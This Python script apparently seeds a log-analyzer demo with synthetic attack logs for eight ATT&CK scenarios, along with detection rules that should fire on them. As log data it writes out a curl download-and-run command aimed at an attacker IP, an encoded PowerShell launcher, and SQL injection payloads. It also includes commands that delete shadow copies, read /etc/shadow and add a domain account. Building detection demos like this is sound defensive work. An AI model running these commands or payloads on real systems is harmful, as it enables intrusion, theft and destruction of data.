#!/usr/bin/env python3
"""Attack Simulation Dataset – one-button demo seeder for the logAnalyzer.

Creates a deterministic, recruiter-friendly showcase that demonstrates:
  * realistic event logs from multiple sources (syslog, filebeat, winlogbeat,
    elastic-agent, nginx, application JSON)
  * eight MITRE ATT&CK-mapped attack scenarios
  * detection rules that fire automatically and produce incidents
  * cross-source correlation (e.g. failed logins -> successful login -> sudo)

All timestamps are generated relative to the current wall-clock time so the
events always appear "fresh" in the dashboard's default time window.

Usage::

    python scripts/demo_attack_simulation.py
    python scripts/demo_attack_simulation.py --skip-rules
    python scripts/demo_attack_simulation.py --api-base http://localhost:8000/api/v1

Idempotent: re-running the script overwrites the log files, refreshes the
timestamps and re-ingests. Existing sources/rules with the same name are
patched in-place.
"""
from __future__ import annotations

import argparse
import json
import os
import sys
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Callable, Iterable
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen


# ---------------------------------------------------------------------------
# Time helpers
# ---------------------------------------------------------------------------

# Anchor "now" once so every event in a single run is consistent.
NOW = datetime.now(timezone.utc).replace(microsecond=0)


def iso(offset_seconds: int) -> str:
    """ISO-8601 UTC timestamp, offset_seconds before NOW (negative = future)."""
    return (NOW - timedelta(seconds=offset_seconds)).strftime("%Y-%m-%dT%H:%M:%SZ")


def syslog_bsd(offset_seconds: int) -> str:
    """Classic BSD syslog timestamp 'May 15 13:16:14'."""
    return (NOW - timedelta(seconds=offset_seconds)).strftime("%b %d %H:%M:%S")


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class AttackSource:
    """A single log source that participates in the attack simulation."""
    name: str
    source_type: str  # file | syslog | filebeat | winlogbeat | elastic_agent
    filename: str
    description: str
    lines_factory: Callable[[], Iterable[str]]


@dataclass(frozen=True)
class DetectionRule:
    """A detection rule created via the rules API."""
    name: str
    description: str
    condition: dict[str, Any]
    threshold: int
    window_seconds: int
    severity: str
    mitre_techniques: list[str] = field(default_factory=list)
    mitre_tactic: str | None = None
    group_by_entity: str | None = None
    sequence: list[dict[str, Any]] | None = None


# ---------------------------------------------------------------------------
# Attack scenarios – log line factories
# ---------------------------------------------------------------------------

def _ssh_brute_force_lines() -> list[str]:
    """T1110 – SSH brute force from a single IP against root/admin."""
    attacker_ip = "198.51.100.77"
    host = "edge-gw-01"
    lines: list[str] = []
    # 8 failed attempts within ~40 seconds
    for i in range(8):
        offset = 600 - i * 5  # 10 minutes ago, every 5s
        user = "root" if i % 2 == 0 else "admin"
        port = 54320 + i
        lines.append(
            f"{iso(offset)} {host} sshd[{1300 + i}]: Failed password for invalid user "
            f"{user} from {attacker_ip} port {port} ssh2"
        )
    # Then a successful login from the same IP (credentials guessed!)
    lines.append(
        f"{iso(555)} {host} sshd[1400]: Accepted password for root from {attacker_ip} port 54330 ssh2"
    )
    lines.append(
        f"{iso(553)} {host} sshd[1400]: pam_unix(sshd:session): session opened for user root by (uid=0)"
    )
    # Immediate suspicious action: download + execute payload
    lines.append(
        f"{syslog_bsd(550)} {host} bash[1410]: root : TTY=pts/0 ; PWD=/root ; "
        f"USER=root ; COMMAND=/usr/bin/curl -s http://{attacker_ip}/payload.sh -o /tmp/.x"
    )
    lines.append(
        f"{syslog_bsd(548)} {host} bash[1411]: root : TTY=pts/0 ; PWD=/root ; "
        f"USER=root ; COMMAND=/bin/chmod +x /tmp/.x"
    )
    lines.append(
        f"{syslog_bsd(545)} {host} bash[1412]: root : TTY=pts/0 ; PWD=/root ; "
        f"USER=root ; COMMAND=/tmp/.x"
    )
    return lines


def _linux_priv_esc_lines() -> list[str]:
    """T1548 – Linux privilege escalation via sudo abuse + suspicious binaries."""
    host = "app-srv-02"
    lines = [
        f"{iso(480)} {host} sshd[2001]: Accepted publickey for analyst from 10.20.0.42 port 51820 ssh2",
        f"{syslog_bsd(478)} {host} sudo[2050]: analyst : TTY=pts/1 ; PWD=/home/analyst ; "
        f"USER=root ; COMMAND=/bin/cat /etc/shadow",
        f"{syslog_bsd(475)} {host} sudo[2051]: analyst : TTY=pts/1 ; PWD=/home/analyst ; "
        f"USER=root ; COMMAND=/usr/bin/find / -perm -4000 -type f",
        f"{syslog_bsd(470)} {host} sudo[2052]: analyst : TTY=pts/1 ; PWD=/home/analyst ; "
        f"USER=root ; COMMAND=/usr/bin/vim -c :!/bin/sh /etc/hosts",
        f"{syslog_bsd(465)} {host} kernel: audit: type=1400 audit(0.0:0): apparmor=\"DENIED\" "
        f"operation=\"exec\" profile=\"/usr/bin/sh\" name=\"/bin/sh\" pid=2060 comm=\"vim\"",
        f"{syslog_bsd(460)} {host} sudo[2070]: analyst : 3 incorrect password attempts ; "
        f"TTY=pts/1 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/visudo",
    ]
    return lines


def _windows_powershell_lines() -> list[str]:
    """T1059.001 + T1027 – obfuscated PowerShell via Filebeat."""
    host = "ws-finance-17"
    user = "alice"
    src_ip = "10.20.0.17"
    # Base64-encoded "Invoke-WebRequest" for a fake C2
    enc_payload = (
        "JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABT"
        "AHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA"
    )
    cmds = [
        f'powershell.exe -nop -w hidden -enc {enc_payload}',
        'powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\alice\\AppData\\Local\\Temp\\update.ps1',
        'cmd.exe /c whoami /all',
        'cmd.exe /c net group "Domain Admins" /domain',
        'cmd.exe /c net user backup_admin Sup3r$ecret /add /domain',
    ]
    lines = []
    for i, cmd in enumerate(cmds):
        ts = iso(420 - i * 4)
        lines.append(json.dumps({
            "@timestamp": ts,
            "event": {"code": "endpoint-process", "category": ["process"], "action": "start"},
            "host": {"name": host, "os": {"family": "windows"}},
            "user": {"name": user, "domain": "CORP"},
            "source": {"ip": src_ip},
            "process": {"command_line": cmd, "name": cmd.split()[0]},
            "message": f"Process started: {cmd[:120]}",
        }, separators=(",", ":")))
    return lines


def _kerberoasting_lines() -> list[str]:
    """T1558.003 – Kerberoasting: many TGS requests for service accounts."""
    host = "dc-01"
    src_ip = "10.10.10.21"
    service_accounts = [
        "svc_sql", "svc_iis", "svc_backup", "svc_jenkins",
        "svc_exchange", "svc_sharepoint", "svc_oracle",
    ]
    lines = []
    for i, svc in enumerate(service_accounts):
        ts = iso(360 - i * 3)
        lines.append(json.dumps({
            "@timestamp": ts,
            "event": {"code": "4769", "category": ["authentication"], "action": "kerberos-ticket-requested"},
            "host": {"name": host, "os": {"family": "windows"}},
            "user": {"name": "mallory", "domain": "CORP"},
            "source": {"ip": src_ip},
            "service": {"name": svc},
            "winlog": {"event_data": {"TicketEncryptionType": "0x17", "ServiceName": svc}},
            "message": f"A Kerberos service ticket was requested for {svc} (RC4-HMAC)",
        }, separators=(",", ":")))
    return lines


def _sql_injection_lines() -> list[str]:
    """T1190 – SQL injection probing against a public web app (nginx)."""
    host = "web-edge-01"
    src_ip = "203.0.113.42"
    payloads = [
        "/login?user=admin'--&pw=x",
        "/search?q=%27%20OR%201%3D1--",
        "/products?id=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--",
        "/api/users?id=1%3B%20DROP%20TABLE%20users--",
        "/admin?id=1%27%20AND%20SLEEP(5)--",
        "/login?user=%27%20OR%20%271%27%3D%271&pw=anything",
    ]
    lines = []
    for i, path in enumerate(payloads):
        ts = iso(300 - i * 4)
        status = 500 if "DROP" in path or "SLEEP" in path else 200
        severity = "error" if status >= 500 else "warning"
        lines.append(json.dumps({
            "timestamp": ts,
            "severity": severity,
            "host": host,
            "service": "nginx",
            "message": f'{src_ip} - - "GET {path} HTTP/1.1" {status} 4242 "-" "sqlmap/1.7.2#stable"',
            "fields_json": {
                "source_ip": src_ip,
                "http_method": "GET",
                "http_path": path,
                "http_status": status,
                "user_agent": "sqlmap/1.7.2#stable",
            },
        }, separators=(",", ":")))
    return lines


def _port_scan_lines() -> list[str]:
    """T1046 – Network service discovery (port scan via firewall logs)."""
    host = "fw-perimeter"
    src_ip = "45.155.205.233"
    ports = [21, 22, 23, 25, 80, 110, 143, 443, 445, 993, 995,
             1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 27017]
    lines = []
    for i, port in enumerate(ports):
        ts = iso(240 - i)  # one packet per second – very obvious scan
        lines.append(
            f"{ts} {host} kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:50:56:ab:cd:ef "
            f"SRC={src_ip} DST=10.0.0.10 LEN=60 TOS=0x00 PREC=0x00 TTL=51 ID=0 DF "
            f"PROTO=TCP SPT=44321 DPT={port} WINDOW=29200 RES=0x00 SYN URGP=0"
        )
    return lines


def _data_exfiltration_lines() -> list[str]:
    """T1041 – Exfiltration: unusually large outbound transfers to external IP."""
    host = "db-prod-03"
    dest_ip = "185.220.101.7"  # known TOR exit (example only)
    lines = []
    base_bytes = 250_000_000  # 250 MB chunks
    for i in range(5):
        ts = iso(180 - i * 8)
        size = base_bytes + i * 1_200_000
        lines.append(json.dumps({
            "timestamp": ts,
            "severity": "warning",
            "host": host,
            "service": "netflow",
            "message": f"Large outbound flow to {dest_ip}: {size} bytes over HTTPS",
            "fields_json": {
                "source_ip": "10.0.0.42",
                "dest_ip": dest_ip,
                "dest_port": 443,
                "bytes_out": size,
                "duration_ms": 18_500 + i * 500,
                "protocol": "TCP",
            },
        }, separators=(",", ":")))
    return lines


def _ransomware_lines() -> list[str]:
    """T1486 – Mass file rename / suspicious extensions on file server."""
    host = "fileserver-04"
    user = "bob"
    src_ip = "10.20.0.99"
    extensions = [
        ".docx", ".xlsx", ".pdf", ".jpg", ".png", ".pptx",
        ".sql", ".bak", ".csv", ".zip", ".txt", ".doc",
    ]
    lines: list[str] = []
    # Shadow copy deletion (classic precursor)
    lines.append(json.dumps({
        "@timestamp": iso(150),
        "event": {"code": "endpoint-process", "category": ["process"], "action": "start"},
        "host": {"name": host, "os": {"family": "windows"}},
        "user": {"name": user, "domain": "CORP"},
        "source": {"ip": src_ip},
        "process": {"command_line": "vssadmin.exe delete shadows /all /quiet", "name": "vssadmin.exe"},
        "message": "Shadow copies deletion attempted",
    }, separators=(",", ":")))
    lines.append(json.dumps({
        "@timestamp": iso(148),
        "event": {"code": "endpoint-process", "category": ["process"], "action": "start"},
        "host": {"name": host, "os": {"family": "windows"}},
        "user": {"name": user, "domain": "CORP"},
        "source": {"ip": src_ip},
        "process": {"command_line": "wbadmin.exe delete catalog -quiet", "name": "wbadmin.exe"},
        "message": "Backup catalog deletion attempted",
    }, separators=(",", ":")))
    # Mass file rename with ransomware extension
    for i, ext in enumerate(extensions):
        ts = iso(140 - i * 2)
        lines.append(json.dumps({
            "@timestamp": ts,
            "event": {"code": "endpoint-file", "category": ["file"], "action": "rename"},
            "host": {"name": host, "os": {"family": "windows"}},
            "user": {"name": user, "domain": "CORP"},
            "source": {"ip": src_ip},
            "file": {"path": f"\\\\fileserver\\share\\report_{i:03d}{ext}.LOCKED"},
            "message": f"File renamed to ransomware extension: report_{i:03d}{ext} -> .LOCKED",
        }, separators=(",", ":")))
    # Ransom note dropped
    lines.append(json.dumps({
        "@timestamp": iso(110),
        "event": {"code": "endpoint-file", "category": ["file"], "action": "create"},
        "host": {"name": host, "os": {"family": "windows"}},
        "user": {"name": user, "domain": "CORP"},
        "source": {"ip": src_ip},
        "file": {"path": "\\\\fileserver\\share\\HOW_TO_DECRYPT.txt"},
        "message": "Ransom note dropped: HOW_TO_DECRYPT.txt",
    }, separators=(",", ":")))
    return lines


def _baseline_noise_lines() -> list[str]:
    """Benign baseline noise so the attacks stand out against normal traffic."""
    host = "app-srv-02"
    lines = []
    for i in range(15):
        ts = iso(900 - i * 50)
        lines.append(json.dumps({
            "timestamp": ts,
            "severity": "info",
            "host": host,
            "service": "myapp",
            "message": f"Request processed: GET /api/health 200 ({3 + i % 5}ms)",
            "fields_json": {"http_status": 200, "duration_ms": 3 + i % 5},
        }, separators=(",", ":")))
    return lines


# ---------------------------------------------------------------------------
# Source registry
# ---------------------------------------------------------------------------

ATTACK_SOURCES: tuple[AttackSource, ...] = (
    AttackSource(
        name="demo-attack-ssh-bruteforce",
        source_type="syslog",
        filename="ssh-bruteforce.log",
        description="T1110 – SSH brute-force + successful login + post-exploitation",
        lines_factory=_ssh_brute_force_lines,
    ),
    AttackSource(
        name="demo-attack-linux-privesc",
        source_type="syslog",
        filename="linux-privesc.log",
        description="T1548 – Linux sudo abuse + SUID enumeration",
        lines_factory=_linux_priv_esc_lines,
    ),
    AttackSource(
        name="demo-attack-windows-powershell",
        source_type="filebeat",
        filename="windows-powershell.jsonl",
        description="T1059.001 + T1027 – Obfuscated PowerShell + recon + new admin user",
        lines_factory=_windows_powershell_lines,
    ),
    AttackSource(
        name="demo-attack-kerberoasting",
        source_type="winlogbeat",
        filename="kerberoasting.jsonl",
        description="T1558.003 – Kerberoasting: many TGS requests for service accounts",
        lines_factory=_kerberoasting_lines,
    ),
    AttackSource(
        name="demo-attack-sql-injection",
        source_type="file",
        filename="sql-injection.jsonl",
        description="T1190 – SQL injection probing against public web app",
        lines_factory=_sql_injection_lines,
    ),
    AttackSource(
        name="demo-attack-port-scan",
        source_type="syslog",
        filename="port-scan.log",
        description="T1046 – Network service discovery / port scan",
        lines_factory=_port_scan_lines,
    ),
    AttackSource(
        name="demo-attack-data-exfiltration",
        source_type="file",
        filename="data-exfiltration.jsonl",
        description="T1041 – Large outbound transfers to external IP",
        lines_factory=_data_exfiltration_lines,
    ),
    AttackSource(
        name="demo-attack-ransomware",
        source_type="elastic_agent",
        filename="ransomware.jsonl",
        description="T1486 – Shadow copy deletion + mass file rename + ransom note",
        lines_factory=_ransomware_lines,
    ),
    AttackSource(
        name="demo-attack-baseline-noise",
        source_type="file",
        filename="baseline-noise.jsonl",
        description="Benign baseline traffic so attacks stand out",
        lines_factory=_baseline_noise_lines,
    ),
)


# ---------------------------------------------------------------------------
# Detection rules
# ---------------------------------------------------------------------------

DETECTION_RULES: tuple[DetectionRule, ...] = (
    DetectionRule(
        name="demo-rule-ssh-bruteforce",
        description="5+ failed SSH logins within 60s – classic brute force.",
        condition={
            "service": "sshd",
            "message_contains_any": ["Failed password", "authentication failure"],
        },
        threshold=5,
        window_seconds=60,
        severity="high",
        mitre_techniques=["T1110"],
        mitre_tactic="credential-access",
        group_by_entity="host",
    ),
    DetectionRule(
        name="demo-rule-ssh-bruteforce-success",
        description="Failed SSH logins followed by a successful one on the same host – likely compromise.",
        condition={
            "service": "sshd",
        },
        sequence=[
            {"message_contains": "Failed password"},
            {"message_contains": "Accepted password"},
        ],
        threshold=1,
        window_seconds=300,
        severity="critical",
        mitre_techniques=["T1110", "T1078"],
        mitre_tactic="initial-access",
        group_by_entity="host",
    ),
    DetectionRule(
        name="demo-rule-powershell-encoded",
        description="PowerShell launched with -enc / -EncodedCommand – obfuscated payload.",
        condition={
            "message_contains_any": [
                "powershell -enc",
                "powershell.exe -enc",
                "-EncodedCommand",
                "-nop -w hidden -enc",
            ],
        },
        threshold=1,
        window_seconds=60,
        severity="high",
        mitre_techniques=["T1059.001", "T1027"],
        mitre_tactic="execution",
    ),
    DetectionRule(
        name="demo-rule-kerberoasting",
        description="6+ Kerberos TGS requests (event 4769) within 60s – kerberoasting attempt.",
        condition={
            "event_type": "4769",
        },
        threshold=6,
        window_seconds=60,
        severity="high",
        mitre_techniques=["T1558.003"],
        mitre_tactic="credential-access",
        group_by_entity="host",
    ),
    DetectionRule(
        name="demo-rule-sql-injection",
        description="SQL injection signatures in web access logs.",
        condition={
            "service": "nginx",
            "message_contains_any": [
                "UNION SELECT",
                "OR 1=1",
                "OR '1'='1",
                "SLEEP(",
                "DROP TABLE",
                "sqlmap",
                "%27%20OR",
                "%20UNION%20",
            ],
        },
        threshold=3,
        window_seconds=120,
        severity="high",
        mitre_techniques=["T1190"],
        mitre_tactic="initial-access",
        group_by_entity="host",
    ),
    DetectionRule(
        name="demo-rule-port-scan",
        description="10+ blocked inbound connections from same source – port scan.",
        condition={
            "message_contains_any": ["UFW BLOCK", "iptables denied"],
        },
        threshold=10,
        window_seconds=60,
        severity="warning",
        mitre_techniques=["T1046"],
        mitre_tactic="discovery",
    ),
    DetectionRule(
        name="demo-rule-ransomware-shadow-delete",
        description="Shadow copy / backup catalog deletion – ransomware precursor.",
        condition={
            "message_contains_any": [
                "vssadmin",
                "delete shadows",
                "wbadmin.exe delete catalog",
                "bcdedit /set",
            ],
        },
        threshold=1,
        window_seconds=60,
        severity="critical",
        mitre_techniques=["T1490", "T1486"],
        mitre_tactic="impact",
    ),
    DetectionRule(
        name="demo-rule-ransomware-mass-rename",
        description="Mass file rename / suspicious extension – ransomware in progress.",
        condition={
            "message_contains_any": [".LOCKED", ".encrypted", "HOW_TO_DECRYPT", "ransom note"],
        },
        threshold=5,
        window_seconds=120,
        severity="critical",
        mitre_techniques=["T1486"],
        mitre_tactic="impact",
        group_by_entity="host",
    ),
    DetectionRule(
        name="demo-rule-data-exfiltration",
        description="Repeated large outbound transfers – possible data exfiltration.",
        condition={
            "service": "netflow",
            "message_contains_any": ["Large outbound flow"],
        },
        threshold=3,
        window_seconds=300,
        severity="high",
        mitre_techniques=["T1041"],
        mitre_tactic="exfiltration",
        group_by_entity="host",
    ),
    DetectionRule(
        name="demo-rule-linux-privesc",
        description="Suspicious sudo activity: reading /etc/shadow or SUID enumeration.",
        condition={
            "message_contains_any": [
                "cat /etc/shadow",
                "find / -perm -4000",
                "vim -c :!/bin/sh",
                "incorrect password attempts",
            ],
        },
        threshold=2,
        window_seconds=180,
        severity="high",
        mitre_techniques=["T1548"],
        mitre_tactic="privilege-escalation",
        group_by_entity="host",
    ),
)


_EXTENDED_SOURCE_TYPES = {"filebeat", "winlogbeat", "elastic_agent"}


# ---------------------------------------------------------------------------
# Minimal HTTP client (urllib only – no external deps)
# ---------------------------------------------------------------------------

class ApiError(RuntimeError):
    def __init__(self, method: str, path: str, status_code: int, detail: str) -> None:
        self.method = method
        self.path = path
        self.status_code = status_code
        self.detail = detail
        super().__init__(f"{method} {path} failed with {status_code}: {detail}")


def _json_request(
    api_base: str,
    method: str,
    path: str,
    token: str | None = None,
    body: dict[str, Any] | None = None,
) -> Any:
    url = f"{api_base.rstrip('/')}{path}"
    payload = None
    headers = {"Accept": "application/json"}
    if body is not None:
        payload = json.dumps(body).encode("utf-8")
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = f"Bearer {token}"

    request = Request(url=url, method=method, headers=headers, data=payload)
    try:
        with urlopen(request, timeout=30) as response:
            raw = response.read().decode("utf-8")
            return json.loads(raw) if raw else {}
    except HTTPError as exc:
        detail = exc.read().decode("utf-8", errors="replace")
        raise ApiError(method, path, exc.code, detail) from exc
    except URLError as exc:
        raise RuntimeError(f"{method} {path} failed: {exc}") from exc


# ---------------------------------------------------------------------------
# File writing
# ---------------------------------------------------------------------------

def _repo_root() -> Path:
    return Path(__file__).resolve().parents[1]


def _write_seed_files(seed_dir: Path) -> list[tuple[AttackSource, Path]]:
    seed_dir.mkdir(parents=True, exist_ok=True)
    written: list[tuple[AttackSource, Path]] = []
    for source in ATTACK_SOURCES:
        path = seed_dir / source.filename
        lines = list(source.lines_factory())
        content = "\n".join(lines) + "\n"
        path.write_text(content, encoding="utf-8")
        written.append((source, path))
    return written


def _build_source_config(file_path: Path) -> dict[str, Any]:
    config: dict[str, Any] = {
        "path": str(file_path),
        "source_origin": "demo_attack_simulation",
    }
    repo_data_root = (_repo_root() / "backend" / "data").resolve()
    try:
        relative = file_path.resolve().relative_to(repo_data_root)
    except ValueError:
        return config
    config["log_path"] = str(Path("/app/data") / relative)
    return config


# ---------------------------------------------------------------------------
# API orchestration
# ---------------------------------------------------------------------------

def _check_api_ready(api_base: str, token: str | None) -> None:
    try:
        _json_request(api_base, "GET", "/health", token=token)
    except Exception as exc:  # noqa: BLE001
        raise RuntimeError(
            f"API not reachable at {api_base}. Start backend first "
            f"(e.g. ./scripts/dev-up.sh). Root cause: {exc}"
        ) from exc


def _ensure_sources(
    api_base: str,
    token: str | None,
    written: list[tuple[AttackSource, Path]],
) -> list[str]:
    existing = _json_request(api_base, "GET", "/sources", token=token)
    items = existing.get("items", []) if isinstance(existing, dict) else []
    by_name = {item.get("name"): item for item in items if isinstance(item, dict)}

    source_ids: list[str] = []
    for source, file_path in written:
        payload = {
            "name": source.name,
            "type": source.source_type,
            "config": _build_source_config(file_path),
            "enabled": True,
        }
        current = by_name.get(source.name)
        if current is None:
            try:
                created = _json_request(api_base, "POST", "/sources", token=token, body=payload)
                fallback_used = False
            except ApiError as exc:
                if exc.status_code == 422 and source.source_type in _EXTENDED_SOURCE_TYPES:
                    fallback_payload = {
                        "name": source.name,
                        "type": "file",
                        "config": {
                            **_build_source_config(file_path),
                            "declared_source_type": source.source_type,
                        },
                        "enabled": True,
                    }
                    created = _json_request(api_base, "POST", "/sources", token=token, body=fallback_payload)
                    fallback_used = True
                else:
                    raise RuntimeError(str(exc)) from exc
            source_id = created.get("id")
            tag = f"fallback type=file, declared={source.source_type}" if fallback_used else source.source_type
            print(f"[create] source {source.name} ({tag})")
        else:
            source_id = current.get("id")
            patch_payload = {
                "name": source.name,
                "config": {
                    **_build_source_config(file_path),
                    "declared_source_type": source.source_type,
                },
                "enabled": True,
            }
            _json_request(api_base, "PATCH", f"/sources/{source_id}", token=token, body=patch_payload)
            print(f"[update] source {source.name} ({source.source_type})")

        if not isinstance(source_id, str) or not source_id:
            raise RuntimeError(f"Missing source id for {source.name}")
        source_ids.append(source_id)

    return source_ids


def _ensure_rules(api_base: str, token: str | None) -> None:
    existing = _json_request(api_base, "GET", "/rules", token=token)
    items = existing.get("items", []) if isinstance(existing, dict) else []
    by_name = {item.get("name"): item for item in items if isinstance(item, dict)}

    for rule in DETECTION_RULES:
        body: dict[str, Any] = {
            "name": rule.name,
            "description": rule.description,
            "condition": rule.condition,
            "threshold": rule.threshold,
            "window_seconds": rule.window_seconds,
            "severity": rule.severity,
            "enabled": True,
        }
        if rule.sequence is not None:
            body["sequence"] = rule.sequence
        if rule.group_by_entity is not None:
            body["group_by_entity"] = rule.group_by_entity
        if rule.mitre_techniques:
            body["mitre_techniques"] = rule.mitre_techniques
        if rule.mitre_tactic is not None:
            body["mitre_tactic"] = rule.mitre_tactic

        current = by_name.get(rule.name)
        try:
            if current is None:
                _json_request(api_base, "POST", "/rules", token=token, body=body)
                print(f"[create] rule  {rule.name}")
            else:
                rule_id = current.get("id")
                _json_request(api_base, "PATCH", f"/rules/{rule_id}", token=token, body=body)
                print(f"[update] rule  {rule.name}")
        except ApiError as exc:
            print(f"[warn] rule {rule.name} failed: {exc}", file=sys.stderr)


def _trigger_ingestion(api_base: str, token: str | None, source_ids: list[str]) -> None:
    response = _json_request(
        api_base,
        "POST",
        "/ingestion/run",
        token=token,
        body={"source_ids": source_ids},
    )
    results = response.get("results", []) if isinstance(response, dict) else []
    print("[ingestion] triggered")
    for item in results:
        if not isinstance(item, dict):
            continue
        sid = item.get("source_id", "?")
        lines = item.get("lines_ingested", 0)
        events = item.get("events_created", 0)
        skipped = item.get("skipped", False)
        reason = item.get("reason")
        if skipped:
            print(f"  - {sid}: skipped ({reason})")
        else:
            print(f"  - {sid}: lines={lines}, events={events}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="One-button attack-simulation seeder for the logAnalyzer demo.",
    )
    parser.add_argument(
        "--api-base",
        default=os.getenv("LOGANALYZER_API_BASE", "http://localhost:8000/api/v1"),
        help="Base API URL (default: %(default)s)",
    )
    parser.add_argument(
        "--token",
        default=os.getenv("LOGANALYZER_TOKEN") or os.getenv("LOG_ANALYZER_TOKEN"),
        help="Bearer token (if backend requires auth)",
    )
    parser.add_argument(
        "--seed-dir",
        default="backend/data/uploads/demo-attack-scenarios",
        help="Relative path for generated log files",
    )
    parser.add_argument("--skip-ingestion", action="store_true", help="Only write files + register sources/rules")
    parser.add_argument("--skip-rules", action="store_true", help="Do not create/update detection rules")
    parser.add_argument("--files-only", action="store_true", help="Only write log files (no API calls)")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    repo_root = _repo_root()
    seed_dir = (repo_root / args.seed_dir).resolve()

    print(f"[seed] anchor time = {NOW.isoformat()}")
    print(f"[seed] writing attack scenarios to {seed_dir}")
    written = _write_seed_files(seed_dir)
    for source, file_path in written:
        print(f"  - {source.name}: {file_path.name} – {source.description}")

    if args.files_only:
        print("[done] files-only mode – no API calls performed")
        return 0

    try:
        _check_api_ready(args.api_base, args.token)
        source_ids = _ensure_sources(args.api_base, args.token, written)
        if not args.skip_rules:
            _ensure_rules(args.api_base, args.token)
        else:
            print("[rules] skipped by --skip-rules")
        if not args.skip_ingestion:
            _trigger_ingestion(args.api_base, args.token, source_ids)
        else:
            print("[ingestion] skipped by --skip-ingestion")
    except RuntimeError as exc:
        print(f"[error] {exc}", file=sys.stderr)
        return 1

    print("[done] attack simulation dataset ready – open the dashboard to explore")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
